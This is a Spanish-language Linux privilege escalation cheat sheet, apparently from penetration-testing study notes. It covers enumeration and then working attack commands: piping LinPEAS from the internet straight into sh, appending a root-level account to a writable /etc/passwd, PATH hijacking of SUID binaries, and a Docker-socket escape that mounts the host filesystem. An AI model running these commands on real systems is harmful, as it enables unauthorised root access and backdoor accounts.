# Linux Privilege Escalation

## Enumeración Inicial

### Sistema

```bash
# Info del sistema
uname -a
cat /etc/os-release
hostname

# Usuarios
id
whoami
cat /etc/passwd | grep -v nologin
```

### Herramientas Automáticas

=== "LinPEAS"
    ```bash
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    ```

=== "LinEnum"
    ```bash
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    chmod +x LinEnum.sh && ./LinEnum.sh
    ```

## Vectores de Escalada

### SUID/SGID

```bash
# Buscar binarios SUID
find / -perm -4000 2>/dev/null

# Buscar binarios SGID
find / -perm -2000 2>/dev/null

# Buscar capabilities
getcap -r / 2>/dev/null
```

!!! tip "GTFOBins"
    Consulta [GTFOBins](https://gtfobins.github.io/) para explotar binarios SUID

### Sudo

```bash
# Permisos sudo
sudo -l

# Versión de sudo (CVE-2021-4034, etc)
sudo --version
```

### Cron Jobs

```bash
# Listar cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Monitorear procesos
# Usando pspy
./pspy64
```

### Archivos con Permisos Débiles

```bash
# Archivos escribibles
find / -writable -type f 2>/dev/null

# /etc/passwd escribible
ls -la /etc/passwd
# Si es escribible:
echo 'root2:$(openssl passwd password):0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Kernel Exploits

```bash
# Versión del kernel
uname -r

# Buscar exploits
searchsploit linux kernel $(uname -r)
```

!!! danger "Último recurso"
    Los kernel exploits pueden causar inestabilidad. Usar solo si otros métodos fallan.

## Técnicas Comunes

### Path Hijacking

```bash
# Si un binario SUID ejecuta comandos sin ruta absoluta
echo '/bin/bash' > /tmp/comando
chmod +x /tmp/comando
export PATH=/tmp:$PATH
./binario_vulnerable
```

### Library Hijacking

```bash
# Buscar librerías faltantes
ldd /path/to/binary
strace /path/to/binary 2>&1 | grep "open.*\.so"
```

### Docker Escape

```bash
# Verificar si estamos en Docker
cat /proc/1/cgroup | grep docker

# Si el socket está montado
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
